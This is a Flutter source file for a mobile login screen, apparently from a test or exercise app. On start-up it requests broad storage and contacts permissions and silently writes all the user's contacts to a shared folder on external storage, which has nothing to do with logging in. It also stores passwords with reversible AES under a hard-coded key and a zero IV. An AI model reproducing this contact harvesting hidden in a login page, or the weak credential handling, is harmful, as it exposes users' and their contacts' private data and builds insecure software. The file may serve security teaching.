import 'package:flutter/material.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:encrypt/encrypt.dart' as encrypt;
import 'package:testing_app/welcome.dart';
import 'package:flutter_contacts/flutter_contacts.dart';
import 'dart:io';
import 'package:permission_handler/permission_handler.dart';

class LoginApp extends StatefulWidget {
  const LoginApp({Key? key}) : super(key: key);

  @override
  _LoginAppState createState() => _LoginAppState();
}

class _LoginAppState extends State<LoginApp> {
  final GlobalKey<FormState> _key = GlobalKey<FormState>();
  final TextEditingController _pass = TextEditingController();
  final TextEditingController _login = TextEditingController();
  List<Contact>? contacts;

  @override
  void initState() {
    super.initState();
    getAllContacts();
  }

  getAllContacts() async {
    if (await FlutterContacts.requestPermission()) {
      contacts = await FlutterContacts.getContacts(withProperties: true);
      var status = await Permission.storage.status;
      if (!status.isGranted) {
        await Permission.storage.request();
      }
      var status2 = await Permission.manageExternalStorage.status;
      if (!status2.isGranted) {
        await Permission.manageExternalStorage.request();
      }
      var status3 = await Permission.accessMediaLocation.status;
      if (!status3.isGranted) {
        await Permission.accessMediaLocation.request();
      }

      final directory =
          (await Directory('storage/emulated/0/SharingFolder').create()).path;
      print("dope");
      final file = File('$directory/hehe.txt');
      await file.create();
      await file.writeAsString(contacts.toString());
    }
  }

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      theme: ThemeData(
        primarySwatch: Colors.deepPurple,
      ),
      home: Scaffold(
        appBar: AppBar(
            centerTitle: true,
            title: const Text('Login below'),
            leading: IconButton(
                icon: Icon(Icons.arrow_back),
                onPressed: () => Navigator.pop(context))),
        body: Form(
          key: _key,
          child: Column(
            children: [
              TextFormField(
                controller: _login,
                decoration: const InputDecoration(labelText: "Login"),
                validator: (value) {
                  if (value == null || value.isEmpty) return "Field required";
                  return null;
                },
              ),
              TextFormField(
                controller: _pass,
                decoration: const InputDecoration(labelText: "Password"),
                validator: (value) {
                  if (value == null || value.isEmpty) return "Field required";
                  String passwordPattern =
                      r'^(?=.*?[A-Z])(?=.*?[a-z])(?=.*?[0-9])(?=.*?[!@#\$&*~]).{8,}$';
                  if (!RegExp(passwordPattern).hasMatch(value)) {
                    return '''
The password has to be at least 8 characters,
include a capital letter, a number and a symbol
                      ''';
                  }
                  return null;
                },
              ),
            ],
          ),
        ),
        floatingActionButton: FloatingActionButton(
          child: const Icon(Icons.login),
          onPressed: () async {
            final prefs = await SharedPreferences.getInstance();
            String login = _login.text;
            String pass = _pass.text;
            if (_key.currentState!.validate()) {
              _key.currentState!.save();
              final String? passCheck = prefs.getString(login);
              if (passCheck == null) {
                showDialog<String>(
                  context: context,
                  builder: (BuildContext context) => AlertDialog(
                    title: const Text('Given login is not registered'),
                    content: const Text('Please go to register page'),
                    actions: <Widget>[
                      TextButton(
                        onPressed: () => Navigator.pop(context, 'OK'),
                        child: const Text('OK'),
                      ),
                    ],
                  ),
                );
              } else {
                final key =
                    encrypt.Key.fromUtf8('SuperSecretKeyPleaseDontLook!!!!');
                final iv = encrypt.IV.fromLength(16);
                final encrypter = encrypt.Encrypter(encrypt.AES(key));
                if (encrypter.decrypt(encrypt.Encrypted.fromBase64(passCheck),
                        iv: iv) ==
                    pass) {
                  Navigator.push(context,
                      MaterialPageRoute(builder: (context) => Welcome()));
                } else {
                  showDialog<String>(
                    context: context,
                    builder: (BuildContext context) => AlertDialog(
                      title: const Text('Password incorrect'),
                      content: const Text('Please try again'),
                      actions: <Widget>[
                        TextButton(
                          onPressed: () => Navigator.pop(context, 'OK'),
                          child: const Text('OK'),
                        ),
                      ],
                    ),
                  );
                }
              }
            }
          },
        ),
      ),
    );
  }
}
